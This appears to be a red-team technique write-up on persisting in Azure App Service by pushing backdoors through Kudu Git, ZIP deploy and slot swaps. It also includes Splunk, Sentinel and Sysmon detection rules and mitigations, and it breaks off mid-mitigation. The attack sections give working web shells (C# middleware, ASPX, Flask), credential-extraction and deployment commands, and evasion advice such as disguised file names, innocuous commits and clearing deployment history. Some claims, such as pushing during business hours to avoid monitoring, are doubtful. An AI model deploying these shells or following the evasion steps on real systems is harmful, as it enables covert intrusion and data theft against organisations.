# [PERSIST-SERVER-006]: App Service Deployment Persistence

## 1. METADATA HEADER

| Attribute | Details |
|---|---|
| **Technique ID** | PERSIST-SERVER-006 |
| **MITRE ATT&CK v18.1** | [T1505.003 - Server Software Component: Web Shell](https://attack.mitre.org/techniques/T1505/003/) |
| **Tactic** | Persistence (TA0003) |
| **Platforms** | Azure App Service, M365/Entra ID (via authentication) |
| **Severity** | **Critical** |
| **CVE** | N/A |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2026-01-09 |
| **Affected Versions** | All Azure App Service runtime versions (Windows & Linux) |
| **Patched In** | N/A - Requires organizational hardening |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 2. EXECUTIVE SUMMARY

**Concept:** Azure App Service provides multiple deployment mechanisms (Kudu SCM, source control integration, ZIP deployment, deployment slots) that allow authenticated users to push code directly to production environments. An attacker with access to deployment credentials can inject malicious code (web shells, backdoors) into the application codebase, achieving persistent access that survives application restarts and code rollbacks if the backdoor is committed to the repository. This persistence mechanism operates at the application layer, making it appear as legitimate application code to infrastructure-level security tools.

**Attack Surface:** The attack targets the Azure App Service deployment pipeline, specifically:
- **Kudu SCM Web Interface** (https://appname.scm.azurewebsites.net)
- **Deployment Slot Swaps** (move backdoored code from staging to production)
- **Source Control Deployments** (GitHub, Azure DevOps, BitBucket integration)
- **ZIP Deployment API** (/api/zipdeploy endpoint)
- **FTP/FTPS Upload** (if enabled)

**Business Impact:** **Complete application compromise with persistent access.** An attacker can read all application files (including configuration files with connection strings, API keys), execute arbitrary code in the context of the App Service application pool identity, exfiltrate data, modify user interactions (inject malware/phishing), and pivot to backend services (databases, APIs, storage accounts). If the App Service uses a managed identity with elevated permissions, the attacker can escalate laterally across Azure resources.

**Technical Context:** Deployment takes 5-30 seconds. The attack is **highly stealthy** because:
1. The backdoor appears as legitimate application code
2. Deployment logs are audit-logged but often not reviewed
3. The backdoor survives security scans targeting runtime processes (EDR tools focus on process execution, not code compilation)
4. Once committed to source control, the backdoor persists even if the staging slot is cleaned

### Operational Risk
- **Execution Risk:** **Low** - Only requires valid deployment credentials; no exploitation required
- **Stealth:** **High** - Appears as legitimate code; doesn't trigger EDR/firewall alerts
- **Reversibility:** **No** - Once code is deployed, rollback requires identifying and removing the backdoor from source control

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | AppService-1, AppService-9 | Ensure App Service Authentication is set up; Ensure Web App is using HTTPS and latest TLS |
| **DISA STIG** | SI-10(1) | Information System Monitoring – Ensure applications are monitored for unexpected behavior |
| **CISA SCuBA** | App Service Baseline | Secure baseline for web application security, including secure deployment pipelines |
| **NIST 800-53** | SI-7 | Information System Monitoring (Real-time monitoring of application code changes); AC-3 (Access Control enforcement) |
| **GDPR** | Art. 32 | Security of Processing – Technical and organizational measures to ensure code integrity and prevent unauthorized modifications |
| **DORA** | Art. 9 | Protection and Prevention – Incident prevention and mitigation measures for digital operational resilience |
| **NIS2** | Art. 21 | Cyber Risk Management Measures – Security monitoring for code deployment pipelines |
| **ISO 27001** | A.12.4.1 | Change Management – Control and tracking of application code changes |
| **ISO 27005** | Risk Scenario | "Compromise of Application Code" – Unauthorized modification of deployed application code |

---

## 3. TECHNICAL PREREQUISITES

**Required Privileges:** 
- Deployment credentials for the App Service (can be obtained via credential theft, phishing, or RBAC misconfiguration)
- Or: Entra ID Global Admin (to reset deployment credentials)
- Or: App Service Contributor/Owner role (to modify deployment settings)

**Required Access:** 
- Network access to Azure (or within Azure if App Service is behind private endpoint)
- Valid authentication token or username/password for deployment

**Supported Versions:**
- **Azure App Service:** All versions (both Windows and Linux runtimes)
- **Runtime Frameworks:** ASP.NET, ASP.NET Core, Node.js, Python, Java, PHP, Ruby
- **Deployment Methods:** All methods (Git, GitHub, Azure DevOps, ZIP, FTP, Local Git)

**Tools:**
- [Azure CLI](https://learn.microsoft.com/en-us/cli/azure/) (v2.50.0+)
- [Azure PowerShell](https://learn.microsoft.com/en-us/powershell/azure/) (Az module v10.0.0+)
- [Git](https://git-scm.com/) (Any version)
- Kudu API (built-in to App Service)
- Postman or cURL (for direct API interaction)

---

## 4. ENVIRONMENTAL RECONNAISSANCE

### Verify Deployment Credentials and Methods

```powershell
# Connect to Azure
Connect-AzAccount

# Get App Service resource
$appServiceName = "targetappservice"
$resourceGroup = "target-rg"
$appService = Get-AzWebApp -ResourceGroupName $resourceGroup -Name $appServiceName

# Check if Git deployment is enabled
$appService.RepositorySiteName
# If this shows a value like "targetappservice.scm.azurewebsites.net", Git is enabled

# Check deployment slot configuration
Get-AzWebAppSlot -ResourceGroupName $resourceGroup -Name $appServiceName | Select-Object -ExpandProperty Name

# View deployment credentials
$creds = Get-AzWebAppPublishingCredentials -ResourceGroupName $resourceGroup -Name $appServiceName
# Note: This requires Owner/Contributor rights, and will show username and password
```

**What to Look For:**
- If `RepositorySiteName` is populated, the Kudu deployment engine is active
- Check if deployment slots exist (indicates staging environment that could be backdoored first, then swapped)
- If credentials are visible, note the format: `$appservicename\deploymentusername`

### Check Source Control Integration

```powershell
# Check if App Service is integrated with GitHub/Azure DevOps
$appService = Get-AzWebApp -ResourceGroupName $resourceGroup -Name $appServiceName
$appService.SiteConfig | Select-Object -Property VnetName, FtpsState, MinTlsVersion

# Check if source control deployment is configured
Get-AzWebAppSourceControl -ResourceGroupName $resourceGroup -Name $appServiceName
```

**What to Look For:**
- **Repository URL:** Indicates which source control system is integrated
- **Branch:** Which branch triggers automatic deployments (usually `main` or `production`)
- **Auto Sync:** Whether changes automatically redeploy (High-risk if attacker can commit to the repo)

### Linux/Azure CLI Reconnaissance

```bash
# List all App Services in subscription
az webapp list --output table

# Get specific App Service deployment slot details
az webapp deployment slot list --resource-group <rg> --name <app-name> --output json | jq '.[] | {name, id, state}'

# Check current deployment configuration
az webapp deployment source show --resource-group <rg> --name <app-name>

# Check if FTP/FTPS is enabled
az webapp deployment publishing-profile get --resource-group <rg> --name <app-name> --xml --output tsv | grep -E "publishUrl|userName"
```

---

## 5. DETAILED EXECUTION METHODS AND THEIR STEPS

### METHOD 1: Git Deployment via Kudu (Windows App Service)

**Supported Versions:** All versions (Server 2016+)

#### Step 1: Obtain Deployment Credentials

**Objective:** Extract or reset the Git deployment credentials for the App Service

**Command (PowerShell - If you have Owner/Contributor rights):**
```powershell
# Get publishing profile (XML format with embedded credentials)
$resourceGroup = "target-rg"
$appServiceName = "targetappservice"

# Get the publishing profile
$publishProfile = Get-AzWebAppPublishingProfile -ResourceGroupName $resourceGroup `
  -Name $appServiceName -OutputFile "C:\temp\profile.xml"

# Extract Git URL and credentials from the XML
[xml]$profile = Get-Content "C:\temp\profile.xml"
$gitDeployment = $profile.publishData.publishProfile | Where-Object { $_.publishMethod -eq "MSDeploy" }

# Extract username and password
$gitUsername = $gitDeployment.userName
$gitPassword = $gitDeployment.userPWD
$gitUrl = $gitDeployment.publishUrl

Write-Host "Git URL: $gitUrl"
Write-Host "Git Username: $gitUsername"
Write-Host "Git Password: $gitPassword"
```

**Expected Output:**
```
Git URL: https://targetappservice.scm.azurewebsites.net:443/targetappservice.git
Git Username: $targetappservice\deploymentuser
Git Password: [encrypted-password]
```

**What This Means:**
- The Git URL format is: `https://<app-name>.scm.azurewebsites.net/<app-name>.git`
- The username format is: `$<app-name>\<deployment-user>`
- Once obtained, these credentials grant full read/write access to the codebase

**OpSec & Evasion:**
- Obtaining publishing profile triggers Event ID 900 ("PublishingProfileFetched") in App Service audit logs – may be detected by SOC
- **Evasion:** If you have deployment credentials already, skip this step
- **Detection Likelihood:** Medium - Azure audit logs track this, but many organizations don't monitor it

**Troubleshooting:**
- **Error:** "Get-AzWebAppPublishingProfile: The user does not have access to perform this action"
  - **Cause:** Insufficient RBAC permissions
  - **Fix:** Ensure you have `Website Contributor` or `Owner` role on the App Service

#### Step 2: Clone the Repository

**Objective:** Download the current application source code so you can add your backdoor

**Command:**
```powershell
# Clone the Git repository with credentials
$gitUrl = "https://targetappservice.scm.azurewebsites.net:443/targetappservice.git"
$gitUsername = "`$targetappservice\deploymentuser"
$gitPassword = "[encrypted-password]"

# Create Git URL with embedded credentials
$gitUrlWithCreds = $gitUrl -replace "https://", "https://${gitUsername}:${gitPassword}@"

# Clone repository
cd "C:\temp"
git clone $gitUrlWithCreds targetapp
cd targetapp
```

**Expected Output:**
```
Cloning into 'targetapp'...
remote: Counting objects: 150, done.
remote: Compressing objects: 100% (50/50), done.
Receiving objects: 100% (150/150), 15.00 KiB | 1.50 MiB/s, done.
Resolving deltas: 100% (50/50), done.
```

**What This Means:**
- The repository has been cloned locally
- You now have full access to the source code and can modify it

**OpSec & Evasion:**
- Git clone operations are logged in Azure Activity Log (Operation: "Create Git push")
- **Evasion:** Perform this on a compromised internal machine to avoid external IP logs

#### Step 3: Create a Web Shell Backdoor

**Objective:** Add a web shell to the application codebase (example for ASP.NET Core application)

**Command (Create backdoor.cs in root directory):**
```csharp
// File: C:\temp\targetapp\backdoor.cs
// Add this to the application's Startup.cs or Program.cs

using System;
using System.Diagnostics;
using System.IO;
using Microsoft.AspNetCore.Builder;
using Microsoft.AspNetCore.Http;

public class BackdoorMiddleware
{
    private readonly RequestDelegate _next;
    private const string MAGIC_HEADER = "X-Secret-Command"; // Hidden from logs if using obscure header
    
    public BackdoorMiddleware(RequestDelegate next)
    {
        _next = next;
    }
    
    public async Task InvokeAsync(HttpContext context)
    {
        // Check for magic header
        if (context.Request.Headers.TryGetValue(MAGIC_HEADER, out var command))
        {
            // Execute arbitrary command
            var result = ExecuteCommand(command.ToString());
            await context.Response.WriteAsync(result);
            return;
        }
        
        await _next(context);
    }
    
    private string ExecuteCommand(string cmd)
    {
        try
        {
            var processInfo = new ProcessStartInfo
            {
                FileName = "cmd.exe",
                Arguments = $"/c {cmd}",
                RedirectStandardOutput = true,
                UseShellExecute = false,
                CreateNoWindow = true
            };
            
            using (var process = Process.Start(processInfo))
            {
                return process.StandardOutput.ReadToEnd();
            }
        }
        catch (Exception ex)
        {
            return $"Error: {ex.Message}";
        }
    }
}

// Add to Startup.cs in Configure() method:
// app.UseMiddleware<BackdoorMiddleware>();
```

**Alternative: Simple ASPX Web Shell (ASP.NET Classic):**
```aspx
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<html>
<body>
<%
    if (Request["cmd"] != null)
    {
        var p = new Process();
        p.StartInfo.FileName = "cmd.exe";
        p.StartInfo.Arguments = "/c " + Request["cmd"];
        p.StartInfo.RedirectStandardOutput = true;
        p.StartInfo.UseShellExecute = false;
        p.Start();
        Response.Write("<pre>" + p.StandardOutput.ReadToEnd() + "</pre>");
    }
%>
</body>
</html>
```

**Expected Result:**
- File created: `C:\temp\targetapp\backdoor.aspx` (or `.cs` for Core)

**What This Means:**
- The backdoor is now part of the source code
- When deployed, it will execute arbitrary commands

**OpSec & Evasion:**
- Use obfuscated names: `resources.aspx`, `error.aspx`, `help.aspx`
- Place in subdirectories: `/bin/`, `/logs/`, `/temp/`
- Use alternative command execution methods (Powershell remoting, WMI)
- Avoid obvious patterns like `cmd.exe` calls (use `System.Net.Sockets` for reverse shell instead)

#### Step 4: Commit and Push Backdoor to Repository

**Objective:** Push the backdoored code to Azure App Service, triggering automatic deployment

**Command:**
```powershell
# Add backdoor file
cd C:\temp\targetapp
git add backdoor.aspx

# Commit with innocuous message
git commit -m "Update error handling and logging"

# Push to main branch (triggers automatic deployment)
git push origin main
```

**Expected Output:**
```
Enumerating objects: 4, done.
Counting objects: 100% (4/4), done.
Delta compression using up to 8 threads
Compressing objects: 100% (2/2), done.
Writing objects: 100% (3/3), 350 bytes | 350.00 B/s, done.
Total 3 (delta 1), reused 0 (delta 0)
remote: Processing deployment...
remote: Preparing deployment for commit id 'abc123def456'
remote: KuduSync.NET from: 'https://github.com/projectkudu/KuduSync.NET/tree/master'...
remote: Deployment successful.
To https://targetappservice.scm.azurewebsites.net:443/targetappservice.git
   a1b2c3d..e4f5g6h main -> main
```

**What This Means:**
- The code has been pushed to Azure
- Kudu automatically detected the change and redeployed the application
- The backdoor is now live on the production server

**OpSec & Evasion:**
- Use `git commit --amend` to hide commits in the log
- Push during business hours when deployment logs are less likely to be monitored
- Use generic commit messages mixed with legitimate commits

**Troubleshooting:**
- **Error:** "fatal: Authentication failed"
  - **Cause:** Invalid credentials or Git credentials expired
  - **Fix:** Reset deployment credentials via Azure Portal or `Reset-AzWebAppPublishingProfile`

---

### METHOD 2: Kudu API Direct Deployment (Linux App Service)

**Supported Versions:** All versions (Linux runtimes only)

#### Step 1: Create Malicious Application Package

**Objective:** Create a ZIP archive containing the backdoor code

**Command (Bash):**
```bash
# Create temporary directory
mkdir -p /tmp/backdoor_app
cd /tmp/backdoor_app

# For a Python Flask app, create a backdoor
cat > app.py << 'EOF'
from flask import Flask, request, jsonify
import subprocess
import json

app = Flask(__name__)

@app.route('/')
def index():
    return 'OK', 200

@app.route('/admin/status', methods=['POST'])
def execute_command():
    """Hidden endpoint that executes arbitrary commands"""
    try:
        command = request.json.get('cmd')
        if not command:
            return jsonify({'error': 'No command provided'}), 400
        
        result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, text=True)
        return jsonify({'output': result}), 200
    except Exception as e:
        return jsonify({'error': str(e)}), 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
EOF

# Create requirements.txt
cat > requirements.txt << 'EOF'
Flask==2.3.2
Werkzeug==2.3.6
EOF

# Create startup script
cat > startup.sh << 'EOF'
#!/bin/bash
cd /home/site/wwwroot
python -m pip install -r requirements.txt
python app.py
EOF

chmod +x startup.sh

# Create ZIP archive
cd /tmp
zip -r backdoor_app.zip backdoor_app/
```

**Expected Output:**
```
  adding: backdoor_app/app.py (deflated 51%)
  adding: backdoor_app/requirements.txt (deflated 25%)
  adding: backdoor_app/startup.sh (deflated 12%)
```

#### Step 2: Deploy via Kudu ZIP Deploy API

**Objective:** Upload the malicious ZIP file using Kudu's ZIP deployment API

**Command (cURL):**
```bash
# Variables
APP_NAME="targetappservice"
DEPLOYMENT_USER="$${APP_NAME}\deploymentuser"
DEPLOYMENT_PASS="[deployment-password]"
KUDU_URL="https://${APP_NAME}.scm.azurewebsites.net/api/zipdeploy"

# Upload the backdoor ZIP
curl -X POST \
  -u "${DEPLOYMENT_USER}:${DEPLOYMENT_PASS}" \
  --data-binary @/tmp/backdoor_app.zip \
  "${KUDU_URL}" \
  -v

# Check deployment status
curl -X GET \
  -u "${DEPLOYMENT_USER}:${DEPLOYMENT_PASS}" \
  "https://${APP_NAME}.scm.azurewebsites.net/api/deployments" \
  | jq '.[] | {id, status, message}' | head -5
```

**Expected Output:**
```
< HTTP/1.1 202 Accepted
< Content-Type: application/json
{
  "id": "abc123def456",
  "status": "success",
  "complete": true,
  "message": "Created deployment slot 'production'."
}
```

**What This Means:**
- HTTP 202 indicates the deployment was accepted
- Status "success" means the backdoor was deployed
- The application is now running with the backdoor enabled

**OpSec & Evasion:**
- Use POST requests over HTTPS to blend with normal traffic
- The ZIP deployment creates an entry in the deployment history, which logs the operation
- **Evasion:** Clear deployment history if you gain shell access to Kudu

---

### METHOD 3: Deployment Slot Swap (Staging to Production)

**Supported Versions:** All versions

#### Step 1: Deploy Backdoor to Staging Slot

**Objective:** Deploy backdoored code to a non-production slot first

**Command (PowerShell):**
```powershell
$resourceGroup = "target-rg"
$appServiceName = "targetappservice"
$slotName = "staging"

# Create staging slot if it doesn't exist
New-AzWebAppSlot -ResourceGroupName $resourceGroup `
  -Name $appServiceName `
  -Slot $slotName `
  -ErrorAction SilentlyContinue

# Deploy backdoor to staging slot
Publish-AzWebapp -ResourceGroupName $resourceGroup `
  -Name $appServiceName `
  -Slot $slotName `
  -ArchivePath "C:\temp\backdoor.zip"
```

**Expected Output:**
```
Deploying to staging slot...
Deployment completed successfully.
```

#### Step 2: Swap Staging to Production

**Objective:** Move the backdoored staging slot to production, minimizing downtime and avoiding code review

**Command (PowerShell):**
```powershell
# Swap staging slot with production
$slotSwap = @{
    ResourceGroupName = $resourceGroup
    Name = $appServiceName
    SourceSlot = "staging"
    DestinationSlot = "production"
}

Switch-AzWebAppSlot @slotSwap

# Verify swap
Get-AzWebAppSlot -ResourceGroupName $resourceGroup -Name $appServiceName | Select-Object Name, State
```

**Expected Output:**
```
Name      State
----      -----
staging   running
production running
```

**What This Means:**
- Traffic that was going to production is now routed to the previous production slot (now staging)
- The backdoored staging slot is now production
- The swap is atomic – users see no downtime

**OpSec & Evasion:**
- Slot swaps create audit events, but they appear as administrative operations
- If you swap back immediately (to minimize detection window), the production logs will show the backdoor was only active for minutes
- **Evasion:** Perform the swap during maintenance windows or scheduled updates

---

## 6. TOOLS & COMMANDS REFERENCE

### [Azure CLI](https://learn.microsoft.com/en-us/cli/azure/)

**Version:** 2.50.0+

**Installation:**
```bash
# Windows
choco install azure-cli

# Linux
curl -sL https://aka.ms/InstallAzureCLIDeb | sudo bash

# macOS
brew install azure-cli
```

**Key Commands:**
```bash
# Authenticate
az login

# Get deployment credentials
az webapp deployment list-publishing-credentials --resource-group <rg> --name <app> --query "[0].{userName, password}"

# List deployment history
az webapp deployment list --resource-group <rg> --name <app> --output table

# Deploy a ZIP file
az webapp deployment source config-zip --resource-group <rg> --name <app> --src <zip-file>

# Swap slots
az webapp deployment slot swap --resource-group <rg> --name <app> --slot <slot-name>
```

---

### [Azure PowerShell (Az Module)](https://learn.microsoft.com/en-us/powershell/azure/)

**Version:** 10.0.0+

**Installation:**
```powershell
Install-Module -Name Az -Repository PSGallery -Force
Update-Module -Name Az
```

**Key Commands:**
```powershell
# Connect to Azure
Connect-AzAccount

# Get publishing profile with credentials
Get-AzWebAppPublishingProfile -ResourceGroupName <rg> -Name <app> -OutputFile "profile.xml"

# Reset deployment credentials
Reset-AzWebAppPublishingProfile -ResourceGroupName <rg> -Name <app>

# Deploy via ZIP
Publish-AzWebapp -ResourceGroupName <rg> -Name <app> -ArchivePath "C:\backup.zip"
```

---

### [Git](https://git-scm.com/)

**Usage:**
```bash
# Clone App Service Git repository
git clone https://$appname\deploymentuser:password@appname.scm.azurewebsites.net:443/appname.git

# Add, commit, push backdoor
git add backdoor.aspx
git commit -m "Update application"
git push origin main
```

---

## 7. SPLUNK DETECTION RULES

### Rule 1: Unauthorized Web Shell Upload to App Service

**Rule Configuration:**
- **Required Index:** `azure_activity`
- **Required Sourcetype:** `azure:aad:audit`
- **Required Fields:** `properties.result`, `operationName`, `resourceType`
- **Alert Threshold:** Any upload of `.aspx`, `.jsp`, `.php` files to web directories
- **Applies To Versions:** All

**SPL Query:**
```spl
index=azure_activity operationName="Create Deployment" resourceType="Microsoft.Web/sites" 
| search properties.deploymentType=zipdeploy OR properties.deploymentType=git
| stats count by properties.author, properties.message, _time
| where count > 0
| table _time, properties.author, properties.message, count
```

**What This Detects:**
- Any deployment operation that adds files
- The query logs the author (user who triggered it) and deployment message
- Helps identify suspicious deployments that occur outside normal change windows

**Manual Configuration Steps (Splunk Enterprise):**
1. Log into Splunk Web → **Search & Reporting**
2. Click **Settings** → **Searches, reports, and alerts**
3. Click **New Alert**
4. Paste the SPL query
5. Set **Trigger Condition** to `count > 0`
6. Configure **Action** → Email alert to SOC
7. Set **Schedule** to run every 5 minutes

**False Positive Analysis:**
- **Legitimate Activity:** Regular deployments by DevOps team during planned maintenance
- **Benign Tools:** Automated CI/CD pipelines (GitHub Actions, Azure DevOps)
- **Tuning:** Exclude known service accounts: `| where properties.author != "*@mycompany.com"` OR create a whitelist of approved users

---

### Rule 2: Suspicious Activity on Kudu SCM Interface

**Rule Configuration:**
- **Required Index:** `azure_activity`
- **Required Sourcetype:** `azure:aad:audit`
- **Alert Threshold:** > 10 requests to Kudu endpoints in 5 minutes
- **Applies To Versions:** All

**SPL Query:**
```spl
index=azure_activity 
| search (uri="*/api/zipdeploy*" OR uri="*/api/deployments*" OR uri="*/api/command*")
| stats count by clientIpAddress, uri, operationName
| where count > 10
| table clientIpAddress, uri, operationName, count
```

**What This Detects:**
- Multiple ZIP deployments or API calls from a single IP in a short time window
- Indicates automated backdoor deployment or reconnaissance
- The URI patterns show which Kudu APIs are being abused

---

## 8. MICROSOFT SENTINEL DETECTION

### Query 1: App Service Web Shell Upload Detection

**Rule Configuration:**
- **Required Table:** `AzureActivity`
- **Required Fields:** `OperationName`, `ResultType`, `InitiatedBy.user.userPrincipalName`, `TargetResources`
- **Alert Severity:** **High**
- **Frequency:** Run every 5 minutes
- **Applies To Versions:** All Azure App Service versions

**KQL Query:**
```kusto
AzureActivity
| where OperationName in ("Create Deployment", "Publish", "Deploy from Web")
| where ResultType == "Success"
| extend DeploymentMethod = case(
    OperationName contains "Deployment" and tostring(parse_json(tostring(Properties)).deploymentType) == "zipdeploy", "ZipDeploy",
    OperationName contains "Deployment" and tostring(parse_json(tostring(Properties)).deploymentType) == "git", "GitPush",
    "Other")
| where DeploymentMethod in ("ZipDeploy", "GitPush")
| summarize DeploymentCount = count() by InitiatedBy.user.userPrincipalName, ResourceGroup, bin(TimeGenerated, 5m)
| where DeploymentCount > 5
| project TimeGenerated, UserPrincipalName = InitiatedBy.user.userPrincipalName, ResourceGroup, DeploymentCount
```

**What This Detects:**
- Multiple deployments from the same user within a 5-minute window
- Indicates rapid backdoor deployment or mass exploitation
- The query groups by user, resource group, and time to correlate patterns

**Manual Configuration Steps (Azure Portal):**
1. Navigate to **Azure Portal** → **Microsoft Sentinel**
2. Select your workspace → **Analytics**
3. Click **+ Create** → **Scheduled query rule**
4. **General Tab:**
   - Name: `Azure App Service Suspicious Deployment Activity`
   - Severity: `High`
5. **Set rule logic Tab:**
   - Paste the KQL query above
   - Run query every: `5 minutes`
   - Lookup data from the last: `30 minutes`
6. **Incident settings Tab:**
   - Enable **Create incidents**
   - Group related alerts into single incident: **Enabled**
7. Click **Review + create**

**Manual Configuration Steps (PowerShell):**
```powershell
Connect-AzAccount
$ResourceGroup = "YourResourceGroup"
$WorkspaceName = "YourSentinelWorkspace"

New-AzSentinelAlertRule -ResourceGroupName $ResourceGroup -WorkspaceName $WorkspaceName `
  -DisplayName "Azure App Service Suspicious Deployment" `
  -Query @"
AzureActivity
| where OperationName in ('Create Deployment', 'Publish', 'Deploy from Web')
| where ResultType == 'Success'
| summarize count() by InitiatedBy.user.userPrincipalName, bin(TimeGenerated, 5m)
| where count_ > 5
"@ `
  -Severity "High" `
  -Enabled $true
```

---

### Query 2: Unusual Source Control Integration Changes

**Rule Configuration:**
- **Required Table:** `AzureActivity`
- **Alert Severity:** **Medium**
- **Frequency:** Run every 10 minutes

**KQL Query:**
```kusto
AzureActivity
| where OperationName == "Update Web App Source Control"
| where ResultType == "Success"
| extend SourceControlProvider = tostring(parse_json(tostring(Properties)).sourceControlProvider)
| extend Branch = tostring(parse_json(tostring(Properties)).branch)
| project TimeGenerated, InitiatedBy.user.userPrincipalName, SourceControlProvider, Branch, ResourceGroup
| join kind=inner (
    AzureActivity
    | where TimeGenerated > ago(30d)
    | where OperationName == "Update Web App Source Control"
    | summarize LastChange = max(TimeGenerated) by ResourceGroup
) on ResourceGroup
```

**What This Detects:**
- Changes to the Git/source control integration (e.g., redirecting to attacker's repository)
- If a repository URL is changed to an attacker-controlled repo, all future deployments pull from the malicious repo

---

## 9. WINDOWS EVENT LOG MONITORING

**Event ID: 903 (Microsoft-IIS-Configuration Audit)**
- **Log Source:** System
- **Trigger:** IIS configuration changes (web.config modifications)
- **Filter:** Look for changes to authentication, handler mappings, or module additions

**Event ID: 5156 (Windows Firewall - Outbound Connection)**
- **Trigger:** App Service (w3wp.exe or similar) making unexpected outbound connections
- **Filter:** Connections to non-internal IPs on unusual ports

**Manual Configuration Steps (Group Policy):**
1. Open **Group Policy Management Console** (gpmc.msc)
2. Navigate to **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Advanced Audit Policy Configuration**
3. Enable: **Audit Application Generated** (under System Audit Policies → System)
4. Set to: **Success and Failure**
5. Run `gpupdate /force`

**Manual Configuration Steps (Local Policy):**
1. Open **Local Security Policy** (secpol.msc)
2. Navigate to **Security Settings** → **Advanced Audit Policy Configuration** → **System Audit Policies**
3. Enable: **Audit Application Generated**
4. Restart or run: `auditpol /set /subcategory:"Application Generated" /success:enable /failure:enable`

---

## 10. SYSMON DETECTION PATTERNS

**Minimum Sysmon Version:** 13.0+

```xml
<Sysmon schemaversion="4.22">
  <EventFiltering>
    <!-- Detect web server spawning command shells (web shell execution) -->
    <ProcessCreate onmatch="include">
      <ParentImage condition="image">w3wp.exe</ParentImage>
      <Image condition="image">cmd.exe;powershell.exe;whoami.exe;ipconfig.exe</Image>
    </ProcessCreate>
    <ProcessCreate onmatch="include">
      <ParentImage condition="image">dotnet.exe;java.exe;node.exe;python.exe</ParentImage>
      <Image condition="image">cmd.exe;powershell.exe;bash.exe</Image>
    </ProcessCreate>

    <!-- Detect file writes to web directories -->
    <FileCreate onmatch="include">
      <TargetFilename condition="contains">\\wwwroot\\;\\www\\;\\html\\</TargetFilename>
      <TargetFilename condition="image">.aspx;.jsp;.php;.py;.rb</TargetFilename>
    </FileCreate>
  </EventFiltering>
</Sysmon>
```

**Manual Configuration Steps:**
1. Download Sysmon from [Microsoft Sysinternals](https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon)
2. Create a config file `sysmon-config.xml` with the XML above
3. Install Sysmon:
   ```cmd
   sysmon64.exe -accepteula -i sysmon-config.xml
   ```
4. Verify installation:
   ```powershell
   Get-Service Sysmon64
   Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" -MaxEvents 10 | Where-Object { $_.Id -eq 1 }
   ```

---

## 11. MICROSOFT DEFENDER FOR CLOUD

### Detection Alert: Suspicious Web App Deployment

**Alert Name:** "Suspicious deployment activity on App Service detected"
- **Severity:** **High**
- **Description:** Multiple deployments detected within a short time frame, potentially indicating backdoor deployment
- **Applies To:** All subscriptions with Defender for App Service enabled
- **Remediation:** 
  1. Review recent deployments in Azure Portal → App Service → Deployment slots
  2. Check for unauthorized `.aspx`, `.php`, `.jsp` files
  3. Review Git commit history for suspicious changes
  4. If confirmed, delete the backdoor file and recommit clean code

**Manual Configuration Steps (Enable Defender for Cloud):**
1. Navigate to **Azure Portal** → **Microsoft Defender for Cloud**
2. Go to **Environment settings**
3. Select your subscription
4. Under **Defender plans**, enable:
   - **Defender for App Service**: **ON**
5. Click **Save**
6. Go to **Security alerts** to view triggered alerts

---

## 12. MICROSOFT PURVIEW (UNIFIED AUDIT LOG)

### Query: Track App Service Deployments

**Operation Name:** "Create Deployment", "Update Deployment", "Delete Deployment"

```powershell
# Connect to Exchange Online for Purview auditing
Connect-ExchangeOnline

# Search for App Service deployment operations
Search-UnifiedAuditLog -Operations "Create Deployment", "Update Deployment" `
  -StartDate (Get-Date).AddDays(-7) `
  -EndDate (Get-Date) `
  | Export-Csv -Path "C:\Audit\AppServiceDeployments.csv" -NoTypeInformation
```

**Details to Analyze in AuditData:**
- **ObjectId:** The App Service resource name
- **UserId:** Who initiated the deployment
- **CreationTime:** When the deployment occurred
- **SourceIP:** IP address of the deployer

**Manual Configuration Steps (Enable Unified Audit Log):**
1. Navigate to **Microsoft Purview Compliance Portal** (compliance.microsoft.com)
2. Go to **Audit** (left menu)
3. If not enabled, click **Turn on auditing**
4. Wait 24-48 hours for log retention to activate

---

## 13. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

**1. Enforce Deployment Slots with Pre-Swap Validation**

Deployment slots allow you to test code before swapping to production. An attacker can be slowed by enforcing a validation step.

**Manual Steps (Azure Portal):**
1. Go to **Azure Portal** → **App Service** → **Deployment slots**
2. Click **+ Add Slot**
3. Name it `staging`
4. Configure **Pre-swap validation** (under Swap settings):
   - Enable **Always warm up instances before swap**
   - Add a **Health check URL** that validates the application is healthy
5. Create an Azure DevOps pipeline that:
   - Deploys to staging slot
   - Runs automated security scans (checking for web shells)
   - Waits for manual approval before swapping to production

**Manual Steps (PowerShell):**
```powershell
$resourceGroup = "myapp-rg"
$appServiceName = "myapp"

# Enable slot-specific configuration for health checks
$webApp = Get-AzWebApp -ResourceGroupName $resourceGroup -Name $appServiceName
$webApp.SiteConfig.HealthCheckPath = "/healthcheck"
Set-AzWebApp -WebApp $webApp

# Configure slot swap settings
$slotSwapConfig = @{
    ResourceGroupName = $resourceGroup
    Name = $appServiceName
    Slot = "staging"
    HealthCheckPath = "/healthcheck"
}

# Note: Full slot swap configuration requires Azure CLI or Portal
az webapp config slot swap-slot-config --resource-group $resourceGroup --name $appServiceName `
  --slot staging --slot-specific-config-names "WEBSITE_INSTANCE_ID"
```

**2. Restrict Deployment Credentials and Use Managed Identities**

Traditional deployment credentials can be stolen. Use Azure Managed Identities and federated credentials instead.

**Manual Steps (Azure Portal):**
1. Go to **App Service** → **Settings** → **Identity**
2. Enable **System assigned** managed identity
3. Go to **Deployment** → **Deployment credentials**
4. Click **Disable** for basic authentication
5. Configure source control to use federated credentials:
   - Go to **Deployment Center**
   - Select GitHub/Azure DevOps
   - Under authentication, select **Federated Credentials**
   - Authorize using Entra ID (no static credentials stored)

**Manual Steps (PowerShell):**
```powershell
$resourceGroup = "myapp-rg"
$appServiceName = "myapp"

# Enable system-assigned managed identity
$webApp = Get-AzWebApp -ResourceGroupName $resourceGroup -Name $appServiceName
Set-AzWebApp -Name $appServiceName -ResourceGroupName $resourceGroup `
  -AssignIdentity $true

# Disable basic authentication for Kudu/SCM
$webApp.SiteConfig.FtpsState = "Disabled"
$webApp.SiteConfig.BasicAuthPublishingCredentialsEnabled = $false
Set-AzWebApp -WebApp $webApp
```

**3. Enable Repository Configuration with Read-Only Access for Certain Users**

